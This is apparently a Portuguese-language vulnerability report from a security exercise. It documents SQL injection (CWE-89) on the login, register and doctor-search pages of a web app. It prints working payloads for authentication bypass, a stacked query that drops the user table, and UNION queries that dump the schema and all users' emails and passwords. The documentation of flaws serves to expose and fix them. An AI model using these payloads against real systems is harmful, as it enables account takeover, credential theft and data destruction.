## CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
- https://cwe.mitre.org/data/definitions/89.html

**Ver descrição, score e solução no [report.md](../report.md#cwe-89-improper-neutralization-of-special-elements-used-in-an-sql-command-sql-injection).**

---
## Exploração da vulnerabilidade

### Login

O utilizador consegue entrar com um email existente e uma password errada, se inserir no campo 'password':
```sql
' or 1=1 ) -- //
```

![CWE-89](images/CWE-89_image1.png)

![CWE-89](images/CWE-89_image2.png)

Também consegue entrar com o primeiro utilizador da base de dados, se inserir no campo 'password':
```sql
') or 1=1 -- //
```

Neste caso, o primeiro utilizador da base de dados é o **admin**, o qual tem acesso a uma página que permite controlar a base de dados.

![CWE-89](images/CWE-89_image3.png)

Desta forma, o utilizador consegue aceder a uma conta de outro utilizador, ou gerir a base de dados.

<br>

### Register
Nesta página, o utilizador consegue executar múltiplas *queries* SQL, por exemplo, se inserir no campo 'first_name':
```sql
'); DROP TABLE app_user; -- //
```

![CWE-89](images/CWE-89_image4.png)

![CWE-89](images/CWE-89_image5.png)

<br>

### Doctors
Nesta página, o utilizador consegue obter todas as tabelas e colunas da base de dados, se inserir na caixa de pesquisa:
```sql
1' AND 1=2 UNION SELECT sql,1,1 FROM sqlite_master WHERE type='table' -- //
```

![CWE-89](images/CWE-89_image6.png)

Ou obter os nomes, emails e passwords de todos os utilizadores, inserindo na caixa de pesquisa:
```sql
1' AND 1=2 UNION SELECT name_, email, password_ FROM app_user -- //
```

![CWE-89](images/CWE-89_image7.png)

Com esta vulnerabilidade, o utilizador consegue aceder a **qualquer informação** da base de dados.
